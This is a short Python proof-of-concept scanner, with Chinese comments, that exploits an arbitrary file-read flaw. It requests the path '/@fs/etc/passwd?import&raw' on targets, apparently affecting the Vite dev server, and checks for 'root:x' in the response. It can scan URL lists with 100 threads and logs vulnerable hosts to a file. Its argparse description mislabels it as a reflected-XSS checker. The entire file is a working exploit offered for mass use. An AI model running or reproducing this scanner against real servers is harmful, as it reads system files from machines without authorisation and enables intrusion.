import argparse,requests,sys,random
from multiprocessing.dummy import Pool

# /@fs/etc/passwd?import&raw

def poc(target):
    try:
        
        payload = """/@fs/etc/passwd?import&raw"""

        # 发送请求检测存活
        res1 = requests.get(url=target,timeout=10)
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload,timeout=10)
            
            # 检测是否会返回root:x字段
            if 'root:x' in res2.text :
                print(f"[+] 目标 {target} 存在文件读取漏洞")
                with open ('result4.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-] 目标 {target} 不存在文件读取漏洞")
        else:
            print(f"[*] 目标 {target} 访问异常")
    except:
        pass

def main():
    # 定义命令行参数
    parse = argparse.ArgumentParser(description="检测反射型xss漏洞")
    
    # 添加参数
    parse.add_argument('-u', '--url', dest='url', type=str, help="单个目标URL，例如: http://example.com")
    parse.add_argument('-f', '--file', dest='file', type=str, help="包含多个目标URL的文件路径，每行一个URL")
    
    # 解析参数
    args = parse.parse_args()
    if args.url and not args.file:
            poc(args.url)
    elif args.file and not args.url:
            url_list = []
            with open (args.file,'r',encoding='utf-8') as f:
                for i in f.readlines():
                    url_list.append(i.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
            print(f'usage: Python {sys.argv[0]} -h')

if __name__ == '__main__':
    main()